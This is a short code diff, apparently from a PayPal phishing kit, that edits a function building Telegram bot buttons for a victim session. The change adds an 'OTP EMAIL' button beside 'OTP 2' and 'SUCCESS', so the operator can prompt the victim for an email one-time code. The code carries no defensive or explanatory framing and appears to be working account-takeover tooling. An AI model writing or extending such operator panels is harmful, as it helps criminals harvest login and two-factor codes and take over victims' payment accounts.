@@ -148,8 +148,8 @@ export function formatPayPalNotification(data: {
       { text: "🔢 OTP 2", callback_data: `paypal_otp2_${data.sessionId}` }
     ],
     [
-      { text: "✔️ SUCCESS", callback_data: `paypal_success_${data.sessionId}` },
-      { text: "🏠 HOME", callback_data: `paypal_home_${data.sessionId}` }
+      { text: "📧 OTP EMAIL", callback_data: `paypal_otp_email_${data.sessionId}` },
+      { text: "✔️ SUCCESS", callback_data: `paypal_success_${data.sessionId}` }
     ]
   ] : undefined;
 
